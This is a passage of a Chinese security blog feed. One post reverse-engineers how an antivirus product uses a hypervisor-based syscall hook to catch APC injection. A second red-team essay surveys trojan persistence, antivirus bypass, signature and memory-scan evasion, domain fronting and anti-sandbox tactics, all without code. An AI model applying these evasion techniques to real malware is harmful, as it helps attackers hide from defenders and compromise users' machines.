&lt;p&gt;以前总是在臆想杀软会怎么做、怎么检测，最多也就是通过杀与不杀来判断杀软的行为，真正去分析的话能对杀软有更清楚的认知。&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">ring3下，杀软对程序无非就是各种iat hook、inline hook；在ring0由于有pg的出现，杀软厂商们不得不放弃原来使用的hook而使用微软提供的内核回调 我所知道的回调大概有这些 进程创建回调 线程创建回调 模块加载回调 注册表回调 文件监控回调 网络监控回调 这些内核回调函数对于程序行为的监控基本是很完全了，但是还不够，是有很多盲点的。聪明的黑客们也早已想到了很多办法，其中apc注入就是一种最为典型的来绕过这些内核回调监控的方法，早已被滥用于许多木马中。 既然在ring0无法使用回调的方式监控apc注入，有些杀毒软件厂商就将hook位置从内核拿到用户态。ring3下hook的好处是简单、稳定，纵使hook出现了问题也最多是程序崩溃而不会影响全局，而缺点也是显而易见的——容易被绕过、摘除 那么这是否意味着我们只要绕过了ring3下的hook，apc注入便可以成为一种难以被察觉的进程注入手段呢？答案肯定是否定的，只要对apc注入进行过测试就会知道这种方式是会被拦截的。但是杀软是如何监控到的呢？带着这个问题，我开始了探索，并写这篇文章来简要记录。 首先写一个简单的apc注入器，在安装了杀软的环境中进行注入 尽管知道不会是ring3下的hook，但是保险起见，一直跟入到syscall 没有hook 接下来我们要进入内核一探究竟，syscall是进入内核的指令，根据手册，syscall指令会从msr的lstar（0xC0000082）中读取地址作为rip 0: kd&amp;gt; rdmsr c0000082 msr[c0000082] = fffff800`0dc116c0 0: kd&amp;gt; u fffff800`0dc116c0 nt!KiSystemCall64: fffff800`0dc116c0 0f01f8 swapgs fffff800`0dc116c3 654889242510000000 mov qword ptr gs:[10h],rsp fffff800`0dc116cc 65488b2425a8010000 mov rsp,qword ptr gs:[1A8h] fffff800`0dc116d5 6a2b push 2Bh fffff800`0dc116d7 65ff342510000000 push qword ptr gs:[10h] fffff800`0dc116df 4153 push r11 fffff800`0dc116e1 6a33 push 33h fffff800`0dc116e3 51 push rcx 可以看到其中的地址指向了nt!KiSystemCall64，于是在这里下断，运行，程序并没有被断住。 到这里就卡住了，我之前从未对这里下过断点，仅仅知道这个函数大概会根据ssdt找到NtQueueApcThread对应的内核函数并调用，我也想不出任何关于调试器无法在这里下断的原因，尽管我可以静态分析来查看杀软是否对这里进行了hook，但此时我更想知道这到底是怎么一回事。 经过两天的研究事情终于有了一些眉目，在正常的情况下对nt!KiSystemCall64下断点会导致BSOD，而我这里由于杀软做了某些操作导致无事发生。nt!KiSystemCall64的前三条指令设置了gs寄存器以及内核栈，而windbg的调试实际上是依赖于windows内核的，windbg做的只不过是通过串口与内核进行交互，因此在已经进入了ring0但内核栈没有设置正确的情况下触发异常会导致蓝屏。那为什么在安装了杀软的环境中断点没有生效呢？一种情况是可能cpu根本没有运行那些指令，而是绕开了断点走了其他的地方，又或者是杀软可能对一些debug函数进行了hook阻碍了我的调试。 为了检查杀软确实没有在nt!KiSystemCall64中hook，只能静态看一下了，把这个函数的内存dump下来比较一下 PS C:\&amp;gt; diff .\av.dump .\no-av.dump InputObject SideIndicator ----------- ------------- .\no-av.dump =&amp;gt; .\av.dump &amp;lt;= 内容是一致的 从系统调用的入口没办法继续跟进，那就只能从出口入手了。 首先要检查的是ssdt中的内容是否有被更改，从ntdll!NtQueueApcThread中可以看到，他的调用号是45h 0: kd&amp;gt; u nt!KiServiceTable+(dwo(nt!KiServiceTable+(4*45))&amp;gt;&amp;gt;4) nt!NtQueueApcThread: fffff802`36a962a0 4883ec38 sub rsp,38h fffff802`36a962a4 488b442460 mov rax,qword ptr [rsp+60h] fffff802`36a962a9 4889442428 mov qword ptr [rsp+28h],rax fffff802`36a962ae 4c894c2420 mov qword ptr [rsp+20h],r9 fffff802`36a962b3 4d8bc8 mov r9,r8 fffff802`36a962b6 4c8bc2 mov r8,rdx fffff802`36a962b9 33d2 xor edx,edx fffff802`36a962bb e810000000 call nt!NtQueueApcThreadEx (fffff802`36a962d0) ssdt表是正常的，没有被修改 在nt!NtQueueApcThread下断，让程序跑起来，等待程序断下后查看调用堆栈 0: kd&amp;gt; Breakpoint 2 hit nt!NtQueueApcThread: 0010:fffff802`36a962a0 4883ec38 sub rsp,38h 0: kd&amp;gt; k # Child-SP RetAddr Call Site 00 fffffd05`75cf2918 fffff802`3a2b34db nt!NtQueueApcThread 01 fffffd05`75cf2920 ffffe60e`35f67080 0xfffff802`3a2b34db 奇怪的调用者 02 fffffd05`75cf2928 00000000`00000016 0xffffe60e`35f67080 03 fffffd05`75cf2930 fffffd05`75cf2950 0x16 04 fffffd05`75cf2938 00000202`6fdb0000 0xfffffd05`75cf2950 05 fffffd05`75cf2940 00000000`00000000 0x00000202`6fdb0000 与正常的调用作比较 0: kd&amp;gt; k # Child-SP RetAddr Call Site 00 ffff920b`14837a88 fffff800`0dc11bb5 nt!NtQueueApcThread 01 ffff920b`14837a90 00007ffe`27fac644 nt!KiSystemServiceCopyEnd+0x25 02 000000e6`96cff598 00007ffe`258a137f ntdll!NtQueueApcThread+0x14 03 000000e6`96cff5a0 00007ff6`5f1d95d8 KERNELBASE!QueueUserAPC+0x8f 04 000000e6`96cff600 00000000`00000000 xxxx!inject+0x4d8 可以看到杀软对我们的hook 分析这个hook函数 0010:fffff802`3a2b3428 4c8bdc mov r11, rsp ;函数起始位置，栈指针存入r11 0010:fffff802`3a2b342b 49895b08 mov qword ptr [r11+8], rbx ; 存rbx 0010:fffff802`3a2b342f 49897310 mov qword ptr [r11+10h], rsi; 存rsi 0010:fffff802`3a2b3433 57 push rdi 0010:fffff802`3a2b3434 4881ec60010000 sub rsp, 160h 0010:fffff802`3a2b343b 488b842490010000 mov rax, qword ptr [rsp+190h] 0010:fffff802`3a2b3443 48894c2430 mov qword ptr [rsp+30h], rcx 0010:fffff802`3a2b3448 0fb70dbd540600 movzx ecx, word ptr [fffff802`3a31890c] 0010:fffff802`3a2b344f 4889442450 mov qword ptr [rsp+50h], rax 0010:fffff802`3a2b3454 498d4328 lea rax, [r11+28h] 0010:fffff802`3a2b3458 4c89442440 mov qword ptr [rsp+40h], r8 0010:fffff802`3a2b345d 4889442428 mov qword ptr [rsp+28h], rax 0010:fffff802`3a2b3462 4c894c2448 mov qword ptr [rsp+48h], r9 0010:fffff802`3a2b3467 488d442460 lea rax, [rsp+60h] 0010:fffff802`3a2b346c 4889542438 mov qword ptr [rsp+38h], rdx 0010:fffff802`3a2b3471 4d8d8b78ffffff lea r9, [r11-88h] 0010:fffff802`3a2b3478 4c8d442430 lea r8, [rsp+30h] 0010:fffff802`3a2b347d ba16000000 mov edx, 16h 0010:fffff802`3a2b3482 4889442420 mov qword ptr [rsp+20h], rax 0010:fffff802`3a2b3487 e87852ffff call fffff802`3a2a8704 0010:fffff802`3a2b348c 8bd8 mov ebx, eax 0010:fffff802`3a2b348e 3d030500c0 cmp eax, 0C0000503h 0010:fffff802`3a2b3493 7504 jne fffff802`3a2b3499 0010:fffff802`3a2b3495 33db xor ebx, ebx 0010:fffff802`3a2b3497 eb45 jmp fffff802`3a2b34de 0010:fffff802`3a2b3499 85c0 test eax, eax 0010:fffff802`3a2b349b 7841 js fffff802`3a2b34de 0010:fffff802`3a2b349d 488b157c550600 mov rdx, qword ptr [fffff802`3a318a20] ;rdx指向nt!KeServiceDescriptorTable 0010:fffff802`3a2b34a4 0fb70d61540600 movzx ecx, word ptr [fffff802`3a31890c] ;调用号 0010:fffff802`3a2b34ab 4c8b4c2448 mov r9, qword ptr [rsp+48h] 0010:fffff802`3a2b34b0 488b02 mov rax, qword ptr [rdx] ;rax指向了ssdt 0010:fffff802`3a2b34b3 4c8b442440 mov r8, qword ptr [rsp+40h] 0010:fffff802`3a2b34b8 488b542438 mov rdx, qword ptr [rsp+38h] 0010:fffff802`3a2b34bd 8b0c88 mov ecx, dword ptr [rax+rcx*4];根据调用号与ssdt基地址获取了内核函数的偏移 0010:fffff802`3a2b34c0 c1f904 sar ecx, 4 ;右移4位 0010:fffff802`3a2b34c3 4c63d1 movsxd r10, ecx 0010:fffff802`3a2b34c6 488b4c2430 mov rcx, qword ptr [rsp+30h] 0010:fffff802`3a2b34cb 4c03d0 add r10, rax ;计算出目标函数地址 0010:fffff802`3a2b34ce 488b442450 mov rax, qword ptr [rsp+50h] 0010:fffff802`3a2b34d3 4889442420 mov qword ptr [rsp+20h], rax 0010:fffff802`3a2b34d8 41ffd2 call r10 ;调用目标函数 0010:fffff802`3a2b34db 488bd8 mov rbx, rax 0010:fffff802`3a2b34de 4863bc2490010000 movsxd rdi, dword ptr [rsp+190h] 0010:fffff802`3a2b34e6 85ff test edi, edi 0010:fffff802`3a2b34e8 743a je fffff802`3a2b3524 0010:fffff802`3a2b34ea 488d34fdf8ffffff lea rsi, [rdi*8-8] 0010:fffff802`3a2b34f2 4c8b4c3460 mov r9, qword ptr [rsp+rsi+60h] 0010:fffff802`3a2b34f7 488d542430 lea rdx, [rsp+30h] 0010:fffff802`3a2b34fc 4c63c3 movsxd r8, ebx 0010:fffff802`3a2b34ff b916000000 mov ecx, 16h 0010:fffff802`3a2b3504 ff9434e0000000 call qword ptr [rsp+rsi+0E0h] 0010:fffff802`3a2b350b 3d030500c0 cmp eax, 0C0000503h 0010:fffff802`3a2b3510 7504 jne fffff802`3a2b3516 0010:fffff802`3a2b3512 33db xor ebx, ebx 0010:fffff802`3a2b3514 eb05 jmp fffff802`3a2b351b 0010:fffff802`3a2b3516 85c0 test eax, eax 0010:fffff802`3a2b3518 0f48d8 cmovs ebx, eax 0010:fffff802`3a2b351b 4883ee08 sub rsi, 8 0010:fffff802`3a2b351f 83c7ff add edi, 0FFFFFFFFh 0010:fffff802`3a2b3522 75ce jne fffff802`3a2b34f2 0010:fffff802`3a2b3524 4c8d9c2460010000 lea r11, [rsp+160h]; 清栈 0010:fffff802`3a2b352c 8bc3 mov eax, ebx 0010:fffff802`3a2b352e 498b5b10 mov rbx, qword ptr [r11+10h] 0010:fffff802`3a2b3532 498b7318 mov rsi, qword ptr [r11+18h] 0010:fffff802`3a2b3536 498be3 mov rsp, r11 0010:fffff802`3a2b3539 5f pop rdi ;rsp现在指向 nt!KiSystemServiceCopyEnd + 0x25 0010:fffff802`3a2b353a c3 ret 可以看出它同样实现了KiSystemCall64的功能做了查找ssdt的工作 这段函数不属于任意一个模块，而根据最后函数最后ret的地址指向 nt!KiSystemServiceCopyEnd + 0x25，这似乎意味着这个hook函数是正常从nt!KiSystemServiceCopyEnd调用过来的。但是正常情况来讲nt!KiSystemServiceCopyEnd会从原有的ssdt中取值计算出用户态syscall对应的内核函数，如果这个hook函数是由KiSystemServiceCopyEnd调用的，这也就代表杀软修改了ssdt，这就出现了矛盾。因此我猜测这个返回地址是伪造出来的，可以用这样几种方式实现 push nt!KiSystemServiceCopyEnd + 0x25 jmp hook_func_addr_offset push nt!KiSystemServiceCopyEnd + 0x25 mov rax,hook_func_addr jmp rax push nt!KiSystemServiceCopyEnd + 0x25 push hook_func_addr_offset ret 用这样的代码来调用它，我们可以伪造出调用方，防止逆向人员的逆向 尝试在nt!KiSystemServiceCopyEnd设置断点，很幸运，与在KiSystemCall64设置断点不同，在这里断点可以生效。 1: kd&amp;gt; u nt!KiSystemServiceCopyEnd nt!KiSystemServiceCopyEnd: fffff802`3681eb90 f705665a8f0001000000 test dword ptr [nt!KiDynamicTraceMask (fffff802`37114600)],1 fffff802`3681eb9a 0f8593040000 jne nt!KiSystemServiceExitPico+0x1fe (fffff802`3681f033) fffff802`3681eba0 f705de588f0040000000 test dword ptr [nt!PerfGlobalGroupMask+0x8 (fffff802`37114488)],40h fffff802`3681ebaa 0f85f7040000 jne nt!KiSystemServiceExitPico+0x272 (fffff802`3681f0a7) fffff802`3681ebb0 498bc2 mov rax,r10 fffff802`3681ebb3 ffd0 call rax fffff802`3681ebb5 0f1f00 nop dword ptr [rax] fffff802`3681ebb8 65ff0425b82e0000 inc dword ptr gs:[2EB8h] 1: kd&amp;gt; r r10 r10=fffff8023a2b3428 之后的代码会调用r10中指向的函数，而r10的地址正是之前分析的hook函数的地址，看来hook函数的调用这就是nt!KiSystemServiceCopyEnd + 0x25，而并非是伪造出的。 那么这个r10中的地址是怎样得到的呢，从nt!KiSystemServiceCopyEnd往上翻，我们可以找到r10的来源 1: kd&amp;gt; u nt!KiSystemServiceRepeat nt!KiSystemServiceGdiTebAccess nt!KiSystemServiceRepeat: fffff802`3681ea34 4c8d1585ae9f00 lea r10,[nt!KeServiceDescriptorTable (fffff802`372198c0)] fffff802`3681ea3b 4c8d1dfe5f8f00 lea r11,[nt!KeServiceDescriptorTableShadow (fffff802`37114a40)] fffff802`3681ea42 f7437880000000 test dword ptr [rbx+78h],80h fffff802`3681ea49 7413 je nt!KiSystemServiceRepeat+0x2a (fffff802`3681ea5e) fffff802`3681ea4b f7437800002000 test dword ptr [rbx+78h],200000h fffff802`3681ea52 7407 je nt!KiSystemServiceRepeat+0x27 (fffff802`3681ea5b) fffff802`3681ea54 4c8d1d65618f00 lea r11,[nt!KeServiceDescriptorTableFilter (fffff802`37114bc0)] fffff802`3681ea5b 4d8bd3 mov r10,r11 fffff802`3681ea5e 413b443a10 cmp eax,dword ptr [r10+rdi+10h] fffff802`3681ea63 0f832c050000 jae nt!KiSystemServiceExitPico+0x160 (fffff802`3681ef95) fffff802`3681ea69 4d8b143a mov r10,qword ptr [r10+rdi] fffff802`3681ea6d 4d631c82 movsxd r11,dword ptr [r10+rax*4] fffff802`3681ea71 498bc3 mov rax,r11 fffff802`3681ea74 49c1fb04 sar r11,4 fffff802`3681ea78 4d03d3 add r10,r11 fffff802`3681ea7b 83ff20 cmp edi,20h fffff802`3681ea7e 7550 jne nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0) fffff802`3681ea80 4c8b9bf0000000 mov r11,qword ptr [rbx+0F0h] nt!KiSystemServiceGdiTebAccess: fffff802`3681ea87 4183bb4017000000 cmp dword ptr [r11+1740h],0 从代码中可以看出，r10应该是解析了ssdt表后所指向的内核函数，而从我们调试得到的结果来看，r10指向的并非是应该指向的函数，并且ssdt表也没有被修改。 继续在nt!KiSystemServiceRepeat这里下断点，发现情况与之前在KiSystemCall64下断的情况一下，断点并未生效。 经过一番摸索后发现，在nt!KiSystemServiceRepeat+0x47之后的地方下断都可以生效，而在其之前都无法生效 1: kd&amp;gt; u nt!KiSystemServiceRepeat+0x47 nt!KiSystemServiceRepeat+0x47: fffff802`3681ea7b 83ff20 cmp edi,20h fffff802`3681ea7e 7550 jne nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0) fffff802`3681ea80 4c8b9bf0000000 mov r11,qword ptr [rbx+0F0h] ..... 断在这里的时候r10已经指向hook函数 1: kd&amp;gt; g Breakpoint 6 hit nt!KiSystemServiceRepeat+0x47: 0010:fffff802`3681ea7b 83ff20 cmp edi,20h 1: kd&amp;gt; r r10 r10=fffff8023a2b3428 确实有点不知道如何是好了，看起来在执行syscall之后，cpu并没有来到nt!KiSystemCall64，而是走了另外的代码，最终又跳转回来。 有想过把附近4gb的内存全部dump下来用ida分析看看是哪里跳过来的，但是仔细一想根本不可行，4gb内存不知道要分析多长时间，而且这4gb内存必然是不连续的，在dump过程中会访问到不可读的内存导致出错。 又折腾了两三天，在查阅资料的过程中我了解到了这是一种基于vmm的hook，他修改了msr中的值，让cpu在执行syscall时跳转到它的hook函数，而当其他人读取msr寄存器中的值时会返回一个伪造的值让msr看起来并没有被修改。但是如何证明杀软确实是这么做的呢？qemu理论应该可以跟踪cpu的执行流程在执行syscall后跳到了hook函数的地址，或者直接获取msr寄存器中真实的值（纯软件模拟应该可以，但是现在qemu并非纯软件模拟了）。最后感觉自己这方面知识太少还不足以去调试vt，只好弄了个最简单的方法：在关掉了虚拟化后，在KiSystemCall64下断可以生效。这大概也算是证明了吧。 基于vmm，不但可以修改msr不被发现，甚至连内存也可以伪造出来，有点想到黑客帝国了。 本来文章到这里应该就结束了，但是一周之后再回头看一眼，尽管已经回答了文章开头提出的问题，但是有点虎头蛇尾，所以准备进一步研究一下。 这次准备找一下杀软处理vm的模块以及相关函数，尽量看一看内部逻辑。 找之前先翻了一些文档以及基于vt的hook框架，大概对vt有了一些了解。由于模块名字比较显眼，一下就看到了对应的模块。根据之前的了解，启动虚拟机需要使用VMXON指令，因此直接搜这个指令一下就可以定位到启用vmx的代码开始逆向 这段代码为启用vmx做了一些检查，然后为每个cpu分配4KB的物理空间用于记录一些信息（vmxon需要），最后调用vmxon进行启用虚拟机，随后调用vmInit进行初始化 vmInit函数很大，一番搜寻后我找到了设置vm host入口的代码，即处理vm事件的函数VM_handler。 VM_hanlder在保存现场之后，调用GetVMExitReason 函数通过vmread读取VM_EXIT_REASON，并根据不同的值调用不同的函数。当cpu使用rdmsr指令时会触发vm_exit事件，其对应的VM_EXIT_REASON为31。当VM_handler捕获到rdmsr指令时会调用SpoofMSRFunc来欺骗调用者，返回假的msr值。 可以看出来当读取msr的index为if中的那些值时这个函数会对其进行处理。 以前总是在臆想杀软会怎么做、怎么检测，最多也就是通过杀与不杀来判断杀软的行为，真正去分析的话能对杀软有更清楚的认知。</summary></entry><entry><title type="html">木马杂谈</title><link href="https://citrusice.github.io/posts/something-ablout-malware/" rel="alternate" type="text/html" title="木马杂谈" /><published>2021-01-02T18:03:45+08:00</published><updated>2021-01-02T18:03:45+08:00</updated><id>https://citrusice.github.io/posts/something-ablout-malware</id><content type="html" xml:base="https://citrusice.github.io/posts/something-ablout-malware/">&lt;p&gt;在红队的这几个月里见识了很多，有不少的收获。如果说做红队跟渗透测试有什么不一样，有一点就是红队会运用到很多针对个人终端的攻击手法。在这其中，木马扮演了十分关键的角色。&lt;/p&gt;

&lt;p&gt;写一点我的想法以及研究方向，不涉及具体实现。&lt;/p&gt;

&lt;h2 id=&quot;命令与控制&quot;&gt;命令与控制&lt;/h2&gt;
&lt;p&gt;木马的基本功能，即攻击者拥有控制木马行为的能力。唯一可以一提的是攻击者操纵木马的自由度，例如cs提供了object file的功能，相当于让攻击者拥有了在木马进程内执行任意代码的能力。&lt;/p&gt;

&lt;h2 id=&quot;bypass主动防御权限维持&quot;&gt;bypass主动防御、权限维持&lt;/h2&gt;
&lt;p&gt;在有了控制目标终端的能力之后，最重要的事情就是维持住这个权限，这一块难点主要就是在目标机器上有一些杀软的情况下去做权限维持。经过一些摸索和测试发现，对杀软来说，任何对系统关键位置进行修改的敏感操作都需要在可信的进程下去进行，否则会对这个行为进行拦截（对用户进行提示，默认拒绝）。可信的进程不单是文件需要有签名，同时需要这个进程向上的进程链上所有的进程都要有签名。&lt;/p&gt;

&lt;p&gt;研究绕过主动防御进行权限维持的方向有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改一些系统非关键位置来实现一些非常规的权限维持，比如针对一些系统上已有的自启动服务寻找dll劫持的漏洞&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将敏感操作放到可信进程中去进行，可以利用已有的进程，也可以自己构造一个可信的进程，当然还可以直接给自己的马整个签名&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关掉主动防御，看起来在r3层与r0层对抗是不可能的，但对于一些自保没做好的杀软依然可以做到直接干掉杀毒软件的进程&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fully-undetectable---木马的伪装与特征隐藏&quot;&gt;Fully UnDetectable - 木马的伪装与特征隐藏&lt;/h2&gt;
&lt;p&gt;一个程序打开不展示任何窗口，没有任何输出，那是个人都会觉得不对劲。而对于杀软来说，一个不创建任何窗口的Win32程序也同样是值得警惕的。因此，给木马捆绑一个正常的程序，既可以让对方放下警戒，也在一定程度上能达到免杀的效果。&lt;/p&gt;

&lt;p&gt;大部分红队都是直接使用现成的马，比如cs，然后配合一个loader用于免杀，有些也会在别人开源项目的基础上定制自己的木马。而就算是纯自研的木马，在开发时如果没有考虑到如何快速变异，时间长了也免不了被分析、提取特征。因此对于这种就总会涉及到基于特征的各种查杀。&lt;/p&gt;

&lt;p&gt;大体上有三种特征，流量特征、文件特征、内存特征&lt;/p&gt;

&lt;p&gt;如何规避查杀？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;对于流量特征，例如cs提供了malleable C2的功能允许使用者将木马的流量伪装成正常的流量，配合https以及域前置就可以达到非常的好的效果。&lt;/li&gt;
  &lt;li&gt;对于文件特征，常用的手段有将shellcode、原始pe进行加密存储，或者当木马运行的时候才将真正的部分从远程加载过来以躲避杀毒软件的静态查杀，核心思想是将真正有特征的部分进行加密或与文件分离存放。&lt;/li&gt;
  &lt;li&gt;但是上面这些隐藏文件特征的手法对于内存查杀来说都没有意义，加密或者从远端获取的payload最终总会在内存里完全的暴露出来，甚至已经有蓝队开发出了针对cs的内存扫描工具，可以将beacon中的配置完全提取。怎么解决？使用自研/魔改的木马可以轻松躲避所有特征的查杀（废话），而对于使用cs这种并不开源的马的红队来讲，尽管cs提供了一些解决方案，但并不是无死角的，这就是一个很大的问题。
通用的隐藏内存中特征的解决方案是我最近在研究的项目。我把木马内存中的特征分为两类，代码段中的特征与数据段中的特征。对于代码段中的特征，可以使用一些保护商业软件防止被破解的思路，加一些代码混淆、膨胀甚至vm壳，改变了代码段的内容后特征自然就消失了。但是很不幸，大部分的特征实际上都是针对木马的数据段来提取的，因此需要想办法来保护数据段。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除此之外，为了更好的应对特征查杀，木马应具有变异的能力。&lt;/p&gt;

&lt;h2 id=&quot;anti-analysis&quot;&gt;anti analysis&lt;/h2&gt;
&lt;p&gt;主要是就是反沙盒和反人工分析&lt;/p&gt;

&lt;p&gt;反沙盒比较重要，我认为基本决定了马能活多长时间，而反人工往往只是为了给分析增加难度（当马已经进入人工分析的阶段那说明这马已经被发现有问题了）。沙盒大概可以分为两种，模拟执行pe的沙盒和完全拟真的虚拟机。前者比如火绒，当用户运行程序前它会将目标程序在它自己的沙盒里跑一遍，没有问题再放行，这种的绕过比较简单，而对于完全拟真的环境就需要去判断。&lt;/p&gt;

&lt;p&gt;我们不能单纯的通过判断当前程序是否运行在虚拟环境中来决定是否执行恶意代码，这会造成使用云桌面、或者是一些使用虚拟化服务器的目标没法上线。比较可行的做法是尽可能小心的收集目标系统上的信息（小心是因为获取部分信息的时候会被沙箱标记上虚拟机检测行为），然后对这些信息进行打分，或者由人工来判断是否继续执行恶意代码。&lt;/p&gt;

&lt;p&gt;为了防止这种完全拟真的环境，有时我们还可以使用基于白名单的做法，即目标中具有xx特征时才真正执行恶意代码，比如目标必须已安装xx软件，上线ip必须处于某个ip段，甚至绑定目标机器的木马，当然这些都需要与其他手段配合使用。&lt;/p&gt;

&lt;p&gt;值得一提的还有很多沙盒与edr对程序的监控。因为内核回调对程序行为的把控有限，它们的监控多是使用r3层的hook，这也就意味着我们可以通过多种方式绕过这种监控，能够起到很好的效果。&lt;/p&gt;

&lt;p&gt;反人工分析意义不是很大，方式也无外乎各种反调试。如果非要做的话，我认为应该把隐藏ioc作为反人工的目标，而不是尽可能的阻碍调试。&lt;/p&gt;

&lt;h2 id=&quot;从木马到rootkit&quot;&gt;从木马到rootkit&lt;/h2&gt;
&lt;p&gt;虽然说木马的功能完全可以都在r3去做，但是我还是想进r0看看&lt;/p&gt;

&lt;h2 id=&quot;关于语言选择&quot;&gt;关于语言选择&lt;/h2&gt;
&lt;p&gt;语言选择需要根据当前红队的开发能力来做，目前比较流行的有python、c#、c/c++，还有最近很火的nim。对于木马开发来讲，我比较倾向于c/c++。python与c#最大的问题是依赖，python打包后体积太大不利于传输或捆绑。c#得益于大部分系统都已经安装了.net，在体积上没有那么劣势，但是.net版本难以协调。有些lib不兼容.net2.0，而有些lib太老早已不维护。并且4.0比2.0多太多新的东西，要想写出兼容性好的代就要放弃这些特性，这又与“便捷”走远了。之前用过一段c#做木马开发，一个组件要维护两个版本，感觉很麻烦，因此我个人不是很喜欢用c#。nim这个语言很好，他实际上是一个代码转译器，将nim代码转为其他代码再通过编译器去编译，它是一个更好的c，因此不存在依赖问题，同时又兼顾了开发的便捷性。我不选择nim其实很大一部分原因是因为我并不熟悉它，不知道它会有怎样的坑，而我在c/c++的领域已经有了一些积累，有很多可以复用的代码让我的开发速度不亚于使用其他语言。另一部分原因是因为c++的模板，它可以做的事情太多了，暂时还没有看到nim里有更好的方式来替代它。c/c++的好处是我可以去干任何事，并且c/c++的代码库很丰富，不管什么功能都可以找到对应的实现。坏处是开发者必须要去干任何事，同时它太底层了，少了很多高级语言的特性，尽管模版可以弥补，但是这就带来了一定的门槛。&lt;/p&gt;

&lt;h2 id=&quot;其他&quot;&gt;其他&lt;/h2&gt;
&lt;p&gt;两个月前写的文章，因为忙于其他事一直没有写完，这两天修修补补总算是差不多了。做这个方向感觉没什么人可以交流，大部分选手所谓的免杀都仅仅停留在使用不同的loader加载shellcode做个文件免杀，没啥意思。不过木马作为终端攻防的重点，一定会随着需求的增加有所发展，相信之后深入研究这些的人会越来越多。&lt;/p&gt;</content><author><name></name></author><category term="develop" /><summary type="html">在红队的这几个月里见识了很多，有不少的收获。如果说做红队跟渗透测试有什么不一样，有一点就是红队会运用到很多针对个人终端的攻击手法。在这其中，木马扮演了十分关键的角色。 写一点我的想法以及研究方向，不涉及具体实现。 命令与控制 木马的基本功能，即攻击者拥有控制木马行为的能力。唯一可以一提的是攻击者操纵木马的自由度，例如cs提供了object file的功能，相当于让攻击者拥有了在木马进程内执行任意代码的能力。 bypass主动防御、权限维持 在有了控制目标终端的能力之后，最重要的事情就是维持住这个权限，这一块难点主要就是在目标机器上有一些杀软的情况下去做权限维持。经过一些摸索和测试发现，对杀软来说，任何对系统关键位置进行修改的敏感操作都需要在可信的进程下去进行，否则会对这个行为进行拦截（对用户进行提示，默认拒绝）。可信的进程不单是文件需要有签名，同时需要这个进程向上的进程链上所有的进程都要有签名。 研究绕过主动防御进行权限维持的方向有 修改一些系统非关键位置来实现一些非常规的权限维持，比如针对一些系统上已有的自启动服务寻找dll劫持的漏洞 将敏感操作放到可信进程中去进行，可以利用已有的进程，也可以自己构造一个可信的进程，当然还可以直接给自己的马整个签名 关掉主动防御，看起来在r3层与r0层对抗是不可能的，但对于一些自保没做好的杀软依然可以做到直接干掉杀毒软件的进程 Fully UnDetectable - 木马的伪装与特征隐藏 一个程序打开不展示任何窗口，没有任何输出，那是个人都会觉得不对劲。而对于杀软来说，一个不创建任何窗口的Win32程序也同样是值得警惕的。因此，给木马捆绑一个正常的程序，既可以让对方放下警戒，也在一定程度上能达到免杀的效果。 大部分红队都是直接使用现成的马，比如cs，然后配合一个loader用于免杀，有些也会在别人开源项目的基础上定制自己的木马。而就算是纯自研的木马，在开发时如果没有考虑到如何快速变异，时间长了也免不了被分析、提取特征。因此对于这种就总会涉及到基于特征的各种查杀。 大体上有三种特征，流量特征、文件特征、内存特征 如何规避查杀？ 对于流量特征，例如cs提供了malleable C2的功能允许使用者将木马的流量伪装成正常的流量，配合https以及域前置就可以达到非常的好的效果。 对于文件特征，常用的手段有将shellcode、原始pe进行加密存储，或者当木马运行的时候才将真正的部分从远程加载过来以躲避杀毒软件的静态查杀，核心思想是将真正有特征的部分进行加密或与文件分离存放。 但是上面这些隐藏文件特征的手法对于内存查杀来说都没有意义，加密或者从远端获取的payload最终总会在内存里完全的暴露出来，甚至已经有蓝队开发出了针对cs的内存扫描工具，可以将beacon中的配置完全提取。怎么解决？使用自研/魔改的木马可以轻松躲避所有特征的查杀（废话），而对于使用cs这种并不开源的马的红队来讲，尽管cs提供了一些解决方案，但并不是无死角的，这就是一个很大的问题。 通用的隐藏内存中特征的解决方案是我最近在研究的项目。我把木马内存中的特征分为两类，代码段中的特征与数据段中的特征。对于代码段中的特征，可以使用一些保护商业软件防止被破解的思路，加一些代码混淆、膨胀甚至vm壳，改变了代码段的内容后特征自然就消失了。但是很不幸，大部分的特征实际上都是针对木马的数据段来提取的，因此需要想办法来保护数据段。 除此之外，为了更好的应对特征查杀，木马应具有变异的能力。 anti analysis 主要是就是反沙盒和反人工分析 反沙盒比较重要，我认为基本决定了马能活多长时间，而反人工往往只是为了给分析增加难度（当马已经进入人工分析的阶段那说明这马已经被发现有问题了）。沙盒大概可以分为两种，模拟执行pe的沙盒和完全拟真的虚拟机。前者比如火绒，当用户运行程序前它会将目标程序在它自己的沙盒里跑一遍，没有问题再放行，这种的绕过比较简单，而对于完全拟真的环境就需要去判断。 我们不能单纯的通过判断当前程序是否运行在虚拟环境中来决定是否执行恶意代码，这会造成使用云桌面、或者是一些使用虚拟化服务器的目标没法上线。比较可行的做法是尽可能小心的收集目标系统上的信息（小心是因为获取部分信息的时候会被沙箱标记上虚拟机检测行为），然后对这些信息进行打分，或者由人工来判断是否继续执行恶意代码。 为了防止这种完全拟真的环境，有时我们还可以使用基于白名单的做法，即目标中具有xx特征时才真正执行恶意代码，比如目标必须已安装xx软件，上线ip必须处于某个ip段，甚至绑定目标机器的木马，当然这些都需要与其他手段配合使用。 值得一提的还有很多沙盒与edr对程序的监控。因为内核回调对程序行为的把控有限，它们的监控多是使用r3层的hook，这也就意味着我们可以通过多种方式绕过这种监控，能够起到很好的效果。 反人工分析意义不是很大，方式也无外乎各种反调试。如果非要做的话，我认为应该把隐藏ioc作为反人工的目标，而不是尽可能的阻碍调试。 从木马到rootkit 虽然说木马的功能完全可以都在r3去做，但是我还是想进r0看看 关于语言选择 